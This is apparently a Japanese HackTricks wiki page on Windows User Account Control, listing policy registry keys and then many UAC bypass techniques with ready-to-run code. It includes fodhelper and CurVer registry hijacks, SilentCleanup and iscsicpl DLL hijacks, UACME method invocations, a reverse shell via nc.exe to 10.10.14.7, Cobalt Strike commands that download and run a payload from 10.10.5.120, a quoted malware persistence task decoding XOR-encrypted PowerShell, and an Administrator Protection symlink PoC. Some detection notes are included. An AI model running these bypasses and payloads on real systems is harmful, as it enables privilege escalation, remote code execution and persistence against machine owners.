# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された操作に対する同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを危険にさらす可能性のある**タスクを実行できます。UAC が有効な場合、管理者がこれらのアプリケーションやタスクにシステムへの管理者レベルのアクセス権を付与して実行することを明示的に承認しない限り、アプリケーションとタスクは常に**非管理者アカウントのセキュリティコンテキストで実行**されます。これは、管理者を意図しない変更から保護する便利な機能ですが、セキュリティ境界とはみなされません。<sup>[[2]](#references)</sup>

integrity レベルの詳細については、以下を参照してください。


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が適用されている場合、管理者ユーザーには 2 つのトークンが付与されます。通常の操作を medium integrity で実行するための標準ユーザートークンと、管理者権限を持つトークンです。

この [ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) では、ログオンプロセス、ユーザーエクスペリエンス、UAC アーキテクチャを含め、UAC の動作について詳しく説明しています。<sup>[[2]](#references)</sup> 管理者はセキュリティポリシーを使用して、組織に応じた UAC の動作をローカルレベル（secpol.msc を使用）で設定したり、Active Directory ドメイン環境で Group Policy Objects (GPO) を介して設定および適用したりできます。さまざまな設定については、[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UAC には設定可能な Group Policy 設定が 10 個あります。以下の表に詳細を示します。

| Group Policy 設定                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: 組み込み Administrator アカウントに対する Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (無効)                                             |
| [User Account Control: Admin Approval Mode の管理者に対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop 上で Windows 以外のバイナリに対する同意を求める) |
| [User Account Control: 標準ユーザーに対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop 上で資格情報を求める)         |
| [User Account Control: アプリケーションのインストールを検出して昇格を求める](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (有効、Enterprise ではデフォルトで無効)           |
| [User Account Control: 署名および検証済みの実行可能ファイルのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (無効)                                             |
| [User Account Control: secure locations にインストールされた UIAccess アプリケーションのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (有効)                                              |
| [User Account Control: すべての管理者を Admin Approval Mode で実行する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (有効)                                              |
| [User Account Control: UIAccess アプリケーションが secure desktop を使用せずに昇格を求めることを許可する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (無効)                                             |
| [User Account Control: 昇格を求める際に secure desktop に切り替える](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (有効)                                              |
| [User Account Control: ファイルおよびレジストリへの書き込み失敗をユーザーごとの場所に仮想化する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (有効)                                              |

### Windows でソフトウェアをインストールするためのポリシー

**local security policies**（ほとんどのシステムでは "secpol.msc"）は、デフォルトで**非管理者ユーザーによるソフトウェアのインストールを防止する**ように設定されています。つまり、非管理者ユーザーがソフトウェアのインストーラーをダウンロードできたとしても、管理者アカウントなしでは実行できません。

### UAC に昇格を求めさせるための Registry Keys

管理者権限を持たない標準ユーザーとして、特定の操作を実行しようとした際に、「標準」アカウントが **UAC によって資格情報を要求される**ように設定できます。この操作には特定の **registry keys** の変更が必要であり、UAC bypass が存在する場合や、攻撃者がすでに管理者としてログインしている場合を除き、管理者権限が必要です。

ユーザーが **Administrators** グループに所属している場合でも、これらの変更により、管理操作を実行するためにユーザーは**アカウントの資格情報を再入力する**必要があります。

**実際には、すでに elevated token、UAC bypass、またはこれらのキーを変更できる misconfiguration が存在する場合にのみ有用です。それ以外の場合、レジストリへの書き込み自体がブロックされます。**

変更する必要がある registry keys とエントリは以下のとおりです（括弧内はデフォルト値です）。

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy ツールから手動で行うこともできます。変更すると、管理操作の実行時にユーザーは資格情報の再入力を求められます。

### Note

**User Account Control はセキュリティ境界ではありません。** したがって、標準ユーザーは local privilege escalation exploit なしにアカウントから脱出して管理者権限を取得することはできません。

### ユーザーに「コンピューターへの完全なアクセス」を求める
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode は整合性チェックを使用し、高い整合性レベルのプロセス（Web ブラウザーなど）が低い整合性レベルのデータ（Temporary Internet Files フォルダーなど）にアクセスするのを防ぎます。これは、ブラウザーを低い整合性レベルのトークンで実行することで実現されます。ブラウザーが低い整合性ゾーンに保存されたデータへアクセスしようとすると、オペレーティングシステムはプロセスの整合性レベルを確認し、それに応じてアクセスを許可します。この機能により、remote code execution 攻撃がシステム上の機密データへアクセスするのを防ぎます。
- ユーザーが Windows にログオンすると、システムはユーザーの privileges の一覧を含む access token を作成します。Privileges は、ユーザーの権利と capabilities の組み合わせとして定義されます。トークンにはユーザーの credentials の一覧も含まれます。これらの credentials は、ユーザーをコンピューターやネットワーク上のリソースに対して認証するために使用されます。

### Autoadminlogon

起動時に特定のユーザーへ Windows を自動的にログオンさせるには、**`AutoAdminLogon` registry key** を設定します。これは kiosk 環境やテスト用途で便利です。レジストリにパスワードが露出するため、安全なシステムでのみ使用してください。

Registry Editor または `reg add` を使用して、以下の keys を設定します。

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

通常のログオン動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> victim に graphical access がある場合、UAC bypass は簡単です。UAC prompt が表示されたときに「Yes」をクリックするだけでよいからです。

UAC bypass は、次の状況で必要になります。**UAC が有効で、process が medium integrity context で実行されており、ユーザーが administrators group に所属している場合です。**

UAC が最高の security level（Always）に設定されている場合は、他の levels（Default）のいずれかに設定されている場合よりも、**UAC bypass がはるかに困難である**ことに注意してください。

### Fast triage from a medium-integrity shell

bypass を試す前に、適切な scenario にいることを確認し、host build を既知の動作する methods に対応付けます。
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
実践的な注意点:
- `EnableLUA=0` の場合、bypass は必要ありません。任意の admin token から直接 high integrity を要求できます。
- `ConsentPromptBehaviorAdmin=2` または `5` は、auto-elevate / COM-based bypasses で一般的なシナリオです。
- `Always Notify` はハードルを上げますが、失敗すると決めつけず、対象の正確な build でテストすべきです。UACME は modern Windows builds 上でも、いくつかの `AlwaysNotify compatible` methods を引き続き追跡しています。<sup>[[3]](#references)</sup>

### UAC disabled

UAC がすでに無効（`ConsentPromptBehaviorAdmin` が **`0`**）になっている場合、次のような方法で **admin privileges**（high integrity level）を持つ reverse shell を **execute** できます:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

AppInfo の local RPC interface `201ef99a-7fa0-444c-9399-19ba84f12a1a` は、debugging を有効にしたプロセスを作成できます。同じ thread 上で debug-created されたプロセスは、その thread の debug object を共有します。また、作成時の debug event には、RPC の結果自体が limited access しか許可しない場合でも、full-access の process handle が含まれます。これにより、debug-object reuse は Administrators group の medium-integrity member 向けの UAC primitive になります。<sup>[[11]](#references)[[12]](#references)</sup>

実用的な chain は次のとおりです。<sup>[[11]](#references)[[12]](#references)</sup>

1. local RPC method を（直接、または `NdrAsyncClientCall` 経由で）呼び出し、debugging を有効にした non-elevated の sacrificial process を作成します。
2. `NtQueryInformationProcess` で `ProcessDebugObjectHandle` を query し、`NtRemoveProcessDebug` で detach して object を保持し、sacrificial process を terminate します。
3. 同じ RPC interface を使用して trusted auto-elevated process を作成し、`DbgUiSetThreadDebugObject` によって保存した object を calling thread に関連付けます。
4. `WaitForDebugEvent` を呼び出し、`CREATE_PROCESS_DEBUG_EVENT` の process handle を取得します。その後、処理を続行する前に `NtDuplicateObject` で duplicate します。
5. duplicate した handle を `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` に渡し、extended startup-info structure を使用して payload を launch します。これにより、elevated process context を再利用すると同時に、child に trusted-looking な parent relationship を与えます。

auto-elevated binary だけでなく、短い sequence を探してください。具体的には、local AppInfo RPC process creation、`ProcessDebugObjectHandle` queries、debugger detach/reattach、直後の creation-debug event、handle duplication、および creation APIs を実行した process と記録された parent が一致しない child です。<sup>[[12]](#references)</sup>

### **Very** Basic UAC "bypass" (full file system access)

Administrators group 内の user で shell を使用できる場合、SMB（file system）経由で共有されている **C$** を新しい disk に local mount でき、**file system 内のすべてに access** できるようになります（Administrator home folder も含まれます）。

> [!WARNING]
> **この trick はもう動作しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strikeを使用したUAC bypass

Cobalt Strikeのtechniqueは、UACが最高セキュリティレベルに設定されていない場合にのみ機能します
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には、**UAC** を **bypass** するためのモジュールも複数あります。

### 昇格された COM インターフェース（`ICMLuaUtil` / `CMSTPLUA`）

自動昇格する COM オブジェクトは、最新のビルドでも依然として実用的な UAC 攻撃対象です。`ICMLuaUtil` は現在の Windows ブランチでも動作すると UACME で追跡されており、攻撃用ツールは、対話型デスクトッププロセス、64-bit 実行、場合によっては COM Elevation Moniker を呼び出す前の PEB／プロセス偽装を組み合わせることで、`CMSTPLUA` への対応を続けています。<sup>[[3]](#references)</sup>

実用上のヒント:
- ユーザーの **interactive session** 内にある **64-bit** プロセス（通常は `explorer.exe` またはその子プロセス）を優先します。
- raw shell が失敗した場合は、単純な `CreateProcess` ラッパーではなく、BOF / UACME の実装から再試行します。
- 子プロセスの実行は、**別の昇格されたプロセス** で行われることを想定してください。多くの BOF は現在の beacon 自体をその場で昇格させません。

### KRBUACBypass

ドキュメントとツールは [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) にあります。

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) は、UAC bypass techniques のコレクションです。Visual Studio または MSBuild でコンパイルすると、複数の実行ファイル（例: `Source\Akagi\output\x64\Debug\Akagi.exe`）が作成されるため、対象のビルドに適した method を選択してください。<sup>[[3]](#references)</sup>\
注意してください。一部の bypass は、ユーザーに警告を与える可能性のある表示プログラムやプロンプトを起動します。<sup>[[3]](#references)</sup>

UACME には、各 technique が動作し始めた **build version** が記載されています。<sup>[[3]](#references)</sup> 自分のバージョンに影響する technique を検索できます。
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[この](https://en.wikipedia.org/wiki/Windows_10_version_history)ページを使用すると、ビルドバージョンから Windows リリース `1607` を取得できます。

実践的なワークフローでは、まず**ホストのビルドを確認**し、その後に一致する method のみを実行します。
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`はローカルのビルドを既知のUAC methodsと迅速に比較できるため、機能しないPoCを素早く除外するのに役立ちます。<sup>[[4]](#references)</sup>
- `UACME`は、bypassを正確なビルドに対応付けるための、現在も最も優れた公開カタログです。Version 3.7.1ではmethods 83–85が追加され、その1つ前のreleaseでは既存のmethodsが**Windows 11 25H2**に対して再テストされました。古いPoCが変更なしで引き続き適用できると仮定せず、method tableとrelease notesを再確認してください。<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify対応のWNF/UIAccess chains (UACME 3.7.1)

`Always Notify`ですべてのUAC bypassが排除されるわけではありません。UACME 3.7.1は、ユーザーが制御可能なenvironment/protocol stateと、elevated scheduled-taskまたはUIAccessの挙動を組み合わせる3つの新しいx64 methodsを実装し、すべてに`AlwaysNotify compatible`のマークを付けています。<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot`をリダイレクトし、WNFによってトリガーされる`\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`に、elevatedな`taskhostw.exe`で`unifiedconsent.dll`をside-loadさせます。UACMEではWindows 10 build 19041以降が対象です。
- **84 — TabTip:** 同じenvironment-variable primitiveをUIAccessの`TabTip.exe`に対して使用します。`TabTip.exe`はビルドに応じて`windows.storage.dll`、`ApplicationTargetedFeatureDatabase.dll`、または`rsaenh.dll`をロードし、その後、結果として得られるhigh-integrity UIAccess contextからpivotします。UACMEではWindows 8.1 / Server 2016以降が対象です。
- **85 — Narrator:** per-userの`feedback-hub` protocolをhijackし、`Alt+CapsLock+F`でNarratorを操作してから、`OskSupport.dll`をside-loadする書き込み可能な`osk.exe`のコピーを起動します。interactive desktopが必要で、Windows 10 1809 / Server 2019以降が対象です。

UACMEのドキュメントに従ってpayload unitsとAkagiをbuildした後、対応するmethod numberを指定して実行します（optional commandのデフォルトは`cmd.exe`です）。
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 と 85 は UIAccess/desktop interaction に依存するため、Session 0 または non-interactive service shell から変更せずに実行しても動作するとは限りません。3 つすべてが environment/protocol state を操作し、DLL を staging するため、テスト後に実装を確認し、それらの artifacts を削除してください。<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼された binary である `fodhelper.exe` は、最新の Windows では auto-elevated されます。起動時に、`DelegateExecute` verb を検証せずに以下の per-user registry path をクエリします。そこに command を配置すると、Administrators のメンバーである user の Medium Integrity process から、UAC prompt なしで High Integrity process を起動できます。

fodhelper がクエリするレジストリパス:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell steps（payload を設定してから trigger）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注記:
- 現在のユーザーが Administrators のメンバーで、UAC レベルがデフォルト/緩い設定の場合に機能します（追加の制限がある Always Notify では機能しません）。
- 64 ビット Windows 上で 32 ビットプロセスから 64 ビット PowerShell を起動するには、`sysnative` パスを使用します。
- Payload には任意のコマンド（PowerShell、cmd、または EXE パス）を指定できます。ステルス性を保つため、プロンプト UI は表示しないでください。

#### CurVer/extension hijack variant (HKCU only)

最近の `fodhelper.exe` を悪用するサンプルでは、`DelegateExecute` を避け、代わりにユーザーごとの `CurVer` 値を介して **`ms-settings` ProgID** をリダイレクトします。auto-elevated binary は引き続き `HKCU` 配下で handler を解決するため、キーを配置するのに admin token は必要ありません:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
昇格後、malwareは通常、`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` を `0` に設定して**今後のプロンプトを無効化**し、その後さらにdefense evasion（例：`Add-MpPreference -ExclusionPath C:\ProgramData`）を実行して、high integrityで実行されるようpersistenceを再作成します。典型的なpersistence taskでは、**XOR-encrypted PowerShell script**をディスク上に保存し、1時間ごとにメモリ内でdecode/executeします。<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
この variant でも dropper をクリーンアップし、staged payloads のみを残すため、検出は **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` tampering、Defender exclusion の作成、またはメモリ上で PowerShell を復号する scheduled tasks の監視に依存することになります。<sup>[[5]](#references)</sup>

### `SilentCleanup` task による UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` は最高権限で `cleanmgr.exe` を起動し、ユーザー環境変数から `%windir%` を展開します。`HKCU\Environment\windir` を制御できる場合、その展開先を任意の command にリダイレクトし、consent dialog なしで high integrity を取得できます。<sup>[[8]](#references)</sup> UACME がこの technique を active のまま維持しており、最近の issue tracking では Windows 11 24H2 で必要なのは quoting の小さな調整だけである可能性が示されているため、この method は最近の build でも引き続き testing する価値があります。<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
そのビルドでタスクがパスを引用符で囲む場合は、引用符で終わる payload（例: `cmd.exe"`）を使って再試行してください。テスト後は必ず `HKCU\Environment\windir` をクリーンアップしてください。

#### その他の UAC bypass

UI フロー、COM オブジェクト、または desktop interaction を悪用する従来の UAC bypass の多くは、被害者との**完全なインタラクティブセッション**を必要とします。一般的な `nc.exe` shell や **Session 0** で実行されている service では、多くの場合不十分です。

この問題は、**meterpreter** session を使うことで解決できる場合があります。**Session** の値が **1** と等しい **process** に migrate してください：

![ms-settings をカスタム拡張子（.thm）に指定し、その拡張子を payload に対応付ける - その他の UAC bypass: meterpreter session を使って実行できます。Session...](<../../images/image (863).png>)

(_explorer.exe_ should works)

### GUI による UAC Bypass

**GUI にアクセスできる場合、UAC prompt が表示されたときに承認するだけで済みます**。実際には、技術的な bypass は必要ありません。そのため、GUI session を取得するだけで、UAC によって生じる実際上の障害を回避できることがよくあります。

さらに、誰かが使用していた GUI session（RDP 経由の可能性があります）を取得した場合、**administrator として実行されている tool が存在することがあり**、そこから例えば **admin として** **cmd** を直接 **run** できるため、UAC による再度の prompt が表示されません。[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) のような tool が該当します。こちらのほうがやや **stealthy** かもしれません。

### ノイジーな brute-force UAC bypass

ノイズが許容される場合は、[**ForceAdmin**](https://github.com/Chainski/ForceAdmin) のような tool を使い、ユーザーが承認するまで elevation を繰り返し要求できます。

### 独自の bypass - Basic UAC bypass methodology

**UACME** を確認すると、**多くの UAC bypass が DLL hijacking を悪用している**ことに気付くでしょう（多くの場合、elevated binary に writable path から attacker-controlled DLL を load させます）。[DLL hijacking vulnerability の見つけ方はこちら](../windows-local-privilege-escalation/dll-hijacking/index.html)を参照してください。

1. **autoelevate** する binary を見つけます（実行時に high integrity level で動作することを確認します）。
2. procmon で、**DLL Hijacking** に対して vulnerable である可能性のある "**NAME NOT FOUND**" event を見つけます。
3. おそらく、書き込み権限のない **protected path**（C:\Windows\System32 など）に DLL を **write** する必要があります。以下を使ってこれを bypass できます：
1. **wusa.exe**: Windows 7、8、8.1。high integrity level で実行される tool であるため、CAB file の content を protected path 内に extract できます。
2. **IFileOperation**: Windows 10。
4. DLL を protected path 内に copy し、vulnerable かつ autoelevated な binary を execute する **script** を準備します。

### もう 1 つの UAC bypass technique

**autoElevated binary** が、**execute** される **binary** または **command** の **name/path** を **registry** から **read** しようとしているかを監視します（binary がこの情報を **HKCU** 内で検索する場合は、より興味深い手法です）。

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack による UAC bypass

32-bit の `C:\Windows\SysWOW64\iscsicpl.exe` は、search order によって `iscsiexe.dll` を load させるために悪用できる **auto-elevated** binary です。**user-writable** folder 内に悪意のある `iscsiexe.dll` を配置し、現在の user の `PATH`（例えば `HKCU\Environment\Path` 経由）を変更してその folder が検索されるようにすると、Windows は **UAC prompt を表示せずに** attacker DLL を elevated `iscsicpl.exe` process 内へ load する可能性があります。<sup>[[1]](#references)[[6]](#references)</sup>

実用上の注意：
- これは、現在の user が **Administrators** に所属しているものの、UAC により **Medium Integrity** で実行されている場合に有用です。
- この bypass では **SysWOW64** の copy が該当します。**System32** の copy は別の binary として扱い、動作を個別に検証してください。
- この primitive は **auto-elevation** と **DLL search-order hijacking** の組み合わせです。そのため、他の UAC bypass で使用するものと同じ ProcMon workflow が、missing DLL load の検証に役立ちます。

最小限の flow：
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
検知のアイデア:
- `reg add` / `HKCU\Environment\Path` へのレジストリ書き込みの直後に、`C:\Windows\SysWOW64\iscsicpl.exe` が実行されるケースをアラートする。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` などの**ユーザーが制御可能な**場所にある `iscsiexe.dll` をハントする。
- `iscsicpl.exe` の起動と、通常の Windows ディレクトリ外からの予期しない子プロセスや DLL のロードを相関分析する。

### 個別に確認する価値のある新しい研究

2024年以降の一部のチェーンは、従来の `HKCU\Software\Classes` レジストリハイジャックとは異なる外観になっています。たとえば、activation-context cache poisoning によって **drive remap** と **DLL redirection** を連鎖させ、`ctfmon.exe` などの信頼された UI / auto-elevated バイナリや、後続の `fodhelper.exe` などのターゲットを介して、medium integrity から high integrity へ移行できます。ここで大規模な PoC を重複して掲載する代わりに、以下にある簡潔な payload の例を確認してください。

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### per-logon-session DOS device map を介した Administrator Protection (preview) のドライブレターハイジャック

> [!NOTE]
> 2026年8月時点でも、Microsoft は Administrator Protection を**Insider preview**として文書化しています。2025年10月の展開は撤回され、後日実施される予定です。これらのチェーンをテストする前に、**Admin Approval Mode with Administrator protection** が実際に有効化され、デバイスが再起動済みであることを確認してください。標準の 25H2 バージョン文字列だけでは、この機能が有効であることの証明にはなりません。<sup>[[10]](#references)</sup>

Windows 11 25H2 preview builds における `RAiLaunchAdminProcess` / UIAccess attack surface の詳細については、専用ページを確認してください。

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 の「Administrator Protection」は、per-session `\Sessions\0\DosDevices/<LUID>` マップを持つ shadow-admin token を使用します。このディレクトリは、最初の `\??` resolution 時に `SeGetTokenDeviceMap` によって遅延作成されます。攻撃者が shadow-admin token を **SecurityIdentification** でのみ impersonate した場合、ディレクトリは攻撃者を **owner** として作成され（`CREATOR OWNER` を継承）、`\GLOBAL??` より優先される drive-letter link が可能になります。<sup>[[7]](#references)</sup>

**手順:**

1. 低権限の session から `RAiProcessRunOnce` を呼び出し、promptless な shadow-admin `runonce.exe` を spawn する。
2. その primary token を **identification** token に Duplicate し、`\??` を開く間だけ impersonate して、攻撃者が所有する `\Sessions\0\DosDevices/<LUID>` の作成を強制する。
3. そこに攻撃者が制御する storage を指す `C:` symlink を作成する。その session で以降に行われる filesystem access は `C:` を攻撃者の path として解決するため、prompt なしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
プレビュー ホストでは、Administrator Protection が `Microsoft-Windows-LUA` プロバイダーの ETW イベント **15031** および **15032** として承認と失敗を記録します。イベントには、要求元 SID、アプリケーション パス、結果、管理対象の Administrator アカウント、認証方式が含まれるため、exploit の繰り返し試行や UI 操作の失敗がテレメトリに記録されないわけではありません。<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
